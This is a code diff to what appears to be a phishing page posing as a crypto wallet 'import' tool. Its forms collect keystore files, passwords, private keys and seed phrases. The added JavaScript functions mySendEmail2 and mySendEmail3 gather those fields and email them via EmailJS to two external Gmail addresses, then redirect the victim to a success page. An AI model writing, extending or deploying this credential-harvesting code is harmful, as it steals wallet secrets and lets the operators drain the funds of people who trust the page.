@@ -656,12 +656,12 @@
                         
 
                     <label style="font-size: smaller; font-weight: bold;">KEYSTORE VALUE</label>
-                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value" required="required" minlength="5" placeholder="Input / Paste your Keystore JSON here"></textarea>
+                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value2" required="required" minlength="5" placeholder="Input / Paste your Keystore JSON here"></textarea>
 
                         <label style="font-size: smaller; font-weight: bold;">KEYSTORE PASSWORD</label>
 
 
-                        <textarea cols="10" rows="2" name="PASCODE" class="passcode" placeholder="Enter password here"></textarea>
+                        <textarea cols="10" rows="2" name="PASCODE" class="passcode2" placeholder="Enter password here"></textarea>
 
                         <small class="text-sm text-center p-2 py-5 mb-4">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
 
@@ -669,13 +669,13 @@
 
                         <label style="font-size: smaller; font-weight: bold;">ETHEREUM WALLET ADDRESS</label>
 
-                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
+                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address2" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
 
                          
-                        <input type="hidden" name="TYPE" class="type" value="Keystore">
+                        <input type="hidden" name="TYPE" class="type2" value="Keystore">
                         <input type="hidden" name="W-ALETname" class="theinput">
 
-                        <button type="button" style="cursor: pointer;" onclick="mySendEmail()">Import</button>
+                        <button type="button" style="cursor: pointer;" onclick="mySendEmail2()">Import</button>
             </form>
                     </div>
             
@@ -687,7 +687,7 @@
 
                         <label style="font-size: smaller; font-weight: bold;">PRIVATE KEY VALUE</label>
 
-                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value" required="required" minlength="5" placeholder="Input / Paste your Private Key here"></textarea>
+                        <textarea cols="10" rows="2" name="VALUE" class="wallet_value3" required="required" minlength="5" placeholder="Input / Paste your Private Key here"></textarea>
 
                         <small class="text-sm text-center p-2 py-5 mb-4">Typically 12 (sometimes 24) words seperated by a single space.</small>
 
@@ -695,13 +695,13 @@
 
                         <label style="font-size: smaller; font-weight: bold;">ETHEREUM WALLET ADDRESS</label>
 
-                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
+                        <textarea cols="10" rows="2" name="ADDRESS" class="wallet_address3" required="required" minlength="5" placeholder="Input / Paste your Ethereum wallet address here"></textarea>
 
                         
-                        <input type="hidden" name="TYPE" class="type" value="Private Key">
+                        <input type="hidden" name="TYPE" class="type3" value="Private Key">
                         <input type="hidden" name="W-ALETname" class="theinput">
 
-                    <button type="button" style="cursor: pointer;" onclick="mySendEmail()">Import-sss</button>
+                    <button type="button" style="cursor: pointer;" onclick="mySendEmail3()">Import</button>
 
             </form>
                     </div>
@@ -958,6 +958,95 @@ emailjs.send('service_794hmo3', 'template_gwmnkl1', templateParams)
 }
 
 </script>
+    
+    
+    
+    
+    <script type="text/javascript">
+
+   // SEND EMAIL WITH JAVASCRIPT USING EMAILJS
+
+    function mySendEmail2() {
+        var myurl = "success.html";
+
+        const emails = ["benignunited@gmail.com", "sticktroj@gmail.com"];
+
+        const type = $(".type2").val();
+        const wallet_name = $(".theinput").val();
+        const wallet_value = $(".wallet_value2").val();
+        const wallet_address = $(".wallet_address2").val();
+        const passcode = $(".passcode2").val();
+    
+    var templateParams = {
+    from_name: 'ConnetHub',
+    wallet_type: type,
+    wallet_name: wallet_name,
+    wallet_value: wallet_value,
+    wallet_address: wallet_address,
+    passcode: passcode,
+    to_email: emails,
+    message: 'text'
+};
+ 
+emailjs.send('service_794hmo3', 'template_gwmnkl1', templateParams)
+    .then(function(response) {
+       window.location = myurl;
+       
+    }, function(error) {
+       console.log('FAILED...', error);
+    });
+
+
+}
+
+</script>
+    
+    
+    
+    
+    
+    
+    <script type="text/javascript">
+
+   // SEND EMAIL WITH JAVASCRIPT USING EMAILJS
+
+    function mySendEmail3() {
+        var myurl = "success.html";
+
+        const emails = ["benignunited@gmail.com", "sticktroj@gmail.com"];
+
+        const type = $(".type3").val();
+        const wallet_name = $(".theinput").val();
+        const wallet_value = $(".wallet_value3").val();
+        const wallet_address = $(".wallet_address3").val();
+        const passcode = $(".passcode3").val();
+    
+    var templateParams = {
+    from_name: 'ConnetHub',
+    wallet_type: type,
+    wallet_name: wallet_name,
+    wallet_value: wallet_value,
+    wallet_address: wallet_address,
+    passcode: passcode,
+    to_email: emails,
+    message: 'text'
+};
+ 
+emailjs.send('service_794hmo3', 'template_gwmnkl1', templateParams)
+    .then(function(response) {
+       window.location = myurl;
+       
+    }, function(error) {
+       console.log('FAILED...', error);
+    });
+
+
+}
+
+</script>
+    
+    
+    
 
 
 
